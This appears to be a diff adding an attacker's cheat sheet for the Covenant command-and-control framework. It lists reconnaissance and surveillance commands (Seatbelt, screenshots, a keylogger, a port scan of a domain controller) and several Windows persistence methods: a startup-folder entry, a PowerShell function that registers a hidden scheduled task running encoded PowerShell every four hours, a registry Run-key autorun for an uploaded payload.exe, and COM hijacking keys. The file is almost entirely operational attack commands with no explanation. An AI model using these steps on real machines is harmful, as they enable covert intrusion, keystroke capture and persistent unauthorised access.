@@ -1,0 +1,63 @@
+ Seatbelt -group=system
+ Screenshot
+ Keylogger 30
+ PortScan fs-1,dc-1 135,445,3389,4444,5985 
+ 
+ #PERSISTENCE
+ PersistStartup
+ C:\Users\j.hunt\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+ ----------------
+ #Scheduled Task
+ PowerShellImport
+ function New-ScheduledTaskPersistence {
+
+    $name = "Persistence"
+  
+    $trigger = New-ScheduledTaskTrigger `
+        -Once `
+        -At 11am `
+        -RepetitionInterval (New-TimeSpan -Hours 4) `
+        -RepetitionDuration (New-TimeSpan -Days 30)
+  
+      $action = New-ScheduledTaskAction `
+        -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
+        -Argument "-Sta -Nop -Window Hidden -EncodedCommand " `
+        -WorkingDirectory "C:\Windows\System32"
+  
+      Register-ScheduledTask `
+        -TaskName $name `
+        -Trigger $trigger `
+        -Action $action `
+        -Force
+}
+ 
+ PowerShell Get-ScheduledTask -TaskName Persistence
+ -----------------------------------------
+ #Registry Autoruns
+ 
+  PersistAutorun
+  Upload .exe form Covenant
+  C:\Users\users\AppData\Local\Temp\payload.exe
+  GetRegistryKey HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+  
+ #COM Hijacking
+ HKEY_CLASSES_ROOT\CLSID and HKEY_CLASSES_ROOT\Interface
+ HKEY_CURRENT_USER\Software\Classes
+  
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
